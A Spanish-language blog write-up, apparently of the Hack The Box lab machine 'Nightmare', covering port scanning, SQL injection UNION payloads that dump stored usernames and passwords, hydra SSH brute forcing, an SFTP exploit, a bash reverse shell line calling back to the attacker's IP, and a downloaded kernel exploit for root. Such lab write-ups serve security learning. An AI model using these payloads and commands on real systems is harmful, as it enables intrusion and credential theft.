---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Nightmare          |
| Os                     | Linux              |
| Difficulty             | Insane             |
| Points                 | 0                  |
| IP                     | 10.10.10.66        |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Nightmare/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.66
```

![nmap 1](/assets/images/Nightmare/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.66 -oG allPorts
```

![nmap2](/assets/images/Nightmare/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,80,2222 10.10.10.66 -oN targeted
```

![nmap 3](/assets/images/Nightmare/nmap3.png)

Ahora que sabemos que el sitio nos permite registrarnos, crearemos un usuario y nos logearemos.
Despues hacemos una prueba al agregar una nota y vemos que es vulnerable a una inyeccion de sql.

![SQLI](/assets/images/Nightmare/sql_test.png)

Tambien despues de revisar si existen despues de este login page mas tipo de inyecciones, vemos que no. Asi que parece que tendremos que estar registrando usuarios para obtener informacion y ademas terminar cerrando la consulta con una ').
Las consultas que haremos son las siguientes:

```sql
') union select 1,schema_name from information_schema.schemata -- -
union select 1,table_name from information_schema.tables where table_schema="sysadmin" -- -
union select 1,column_name from information_schema.columns where table_schema="sysadmin" and table_name="users" -- -
union select 1,group_concat (username,0x3a,password) from sysadmin.users-- -
```

![SQLI 1](/assets/images/Nightmare/SQLI1.png)

![SQLI 2](/assets/images/Nightmare/SQLI2.png)

![SQLI 3](/assets/images/Nightmare/SQLI3.png)

![SQLI 4](/assets/images/Nightmare/SQLI4.png)

Ahora tenemos las contrasenas y usuarios almacenados en la base de datos. 
Las almacenaremos y acomodaremos en filas para poder intentar entrar con otra herramienta por fuerza bruta a travez del puerto 2222 que es de ssh con hydra

```s
#Para separar los usuarios, de las contrasenas
cat data | awk '{print$1}' FS=":" > users
cat data | awk '{print$2}' FS=":" > passwords
hydra -s 2222 ssh://10.10.10.66 -L users -P passwords
```

![hydra](/assets/images/Nightmare/hydra.png)

Ahora que tenemos claves potenciales, podemos entrar por ssh. Parece que la contrasena es valida, pero no nos da acceso a la insersion de comandos. Como no nos da acceso, lo siguiente seria intentar entrar con SFTP, de la forma siguiente:

```s
sftp -P 2222 ftpuser@10.10.10.66
```

Ahora podemos ver algunos archivos, navegar por el usuario e incluso visualizar la flag pero no tenemos permisos para descargarla.
Lo siguiente seria buscar algun exploit para este servicio de sftp, ya que es version 3 y existen <a href="https://raw.githubusercontent.com/SECFORCE/sftp-exploit/master/sftp-exploit.py">unos</a> para versiones igual o menores a la 6.6. 

Ahora nos creamos un directorio en la ruta /mnt/montura y ejecutamos

```s
sshfs -p 2222 ftpuser@10.10.10.66: /mnt/montura/
```

Podemos ahora ver claramente la carpeta passwd y cualquier otra, menos la flag.

Lo siguiente sera usar el exploit, hay que cambiar los parametros de la IP, Puerto, Usuario y contrasena, lo mas importante seria el comando a ejecutar. Intentaremos mandando un ping de la siguiente forma:

```s
tcpdump -i tun0 -n
```

Como no recibimos trazas, lo siguiente seria intentar entrar con la contrasena que encontramos pero ahora a travez del servicio de ftp

```s
sftp -P 2222 ftpuser@10.10.10.66
```

![sftp](/assets/images/Nightmare/sftp.png)

Lo siguiente por hacer es que como si nos dio coneccion, podremos ahora usar el exploit anteriormente mencionado. En esta parte presente problemas y me atore un poco, por las librerias de pip que se instalaban para python3, yo creo que la forma mas sencilla de solucionarlo era modificando la ruta de pip /home/rebick/.local/lib/pip en la cabecera que indica que version de python usar y senalar el python2

Como la traza de itcmp ha llegado correctamente, lo que podemos hacer para establecer una reverse shell ahora, es hacernos un archivo index.html, de la manera siguiente

```bash
#!/bin/bash 

bash -i >& /dev/tcp/10.10.14.29/443 0>&1
```

![ftp user](/assets/images/Nightmare/ftp_user.png)

Una vez dentro, iniciamos una shell iteractiva:

```s
script /dev/null -c bash
tty
```

CTRL+z

```s
stty raw -echo; fg
reset xterm
export SHELL=bash
```

Ahora para escalar privilegios, desde raiz vamos a buscar algun binario que nos permita escalarlos de la manera siguiente:

```s
find \-perm -4000 2>/dev/null
find \-perm -2000 2>/dev/null
```

Otra forma de listar vias potenciales es a traves de las capabilities con:

```s
getcap -r / 2>/dev/null
```

encontramos una via potencial a traves del sls, el cual es practicamente un duplicado del comando ls, lo siguiente seria analizarlo con ghidra para comprender mas sobre lo que esta sucediendo a bajo nivel.

Para copiarnos el sls, lo convertiremos a base64 y lo copiaremos para guardarlo en nuestra maquina.

```s
base64 -w 0 /usr/bin/sls; echo
```

Y ahora para poder modificar un archivo que se esta ejecutando:

```s
cat sls | base64 -d | sponge sls 
```

Otro metodo de analisis que podemos usar es:

```s
radare2 ./sls
```
Lo siguiente seran comandos dentro de radare

```s
#Para analizar todas las funciones
aaa
#Para listar las funciones existentes
afl
#Para sincronizarse con main *EJEMPLo
s main
#Para ver en ensamblador las instrucciones que se estan ejecutando
pdf
#Para ver en tipo C las funciones
pdc
#Para verlo mejor, se puede hacer un 
VVV
#Despues podemos centrar la caja de funcion con solo teclear las iniciales que estan en la cabecera.
#Si queremos mover los bloques hay que presionar la tecla y se vuelve a presionar para que se quede quieto
c
#Para hacer un Highlight hay que poner una
/ var_34h
#Para ver las direcciones de memoria hay que poner una 
P
#Para cambiar el nombre de la variable
afvn LOOP_COUNTER var_2ch
```

![Radar view](/assets/images/Nightmare/radar_view.png)

Para meter breakpoints, apoyandonos de radare para ver las direcciones en cada parte del codigo ejecutandose hay otra herramienta como:

```s
gdb ./sls
```
Despues de analizar el programa, parece que al utilizar el sls -b, dando un slato de linea e insertando el comando que deseamos, lograremos tener acceso al grupo decoder. Si insertamos el comando sh podremos tener una shell con este privilegio y ahora ver la flag de usuario.

Ahora, para ganarnos el root. Si vemos la version del kernel con /etc/os-release y encontramos un exploit en <a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c">github</a>.
Como no tenemos permiso de escritura, nos tendremos que meter al directorio test, con nuestra shell con el grupo decoder y ahi hacer el wget hacia nuestro equipo del archivo poc.

Se presenta un error de reconocimiento de kernel, asi que lo que haremos es borrar los demas kernel y dejar la version del nuestro para que pueda ejecutarse bien.

Lo siguiente sera salirnos de la shell que tenemos, ya que tenemos permisos de ejecusion, pero no de acceso dentro de test y podremos ejecutarlo correctamente.

![Root](/assets/images/Nightmare/root.png)

![Powned](/assets/images/Nightmare/powned.png)
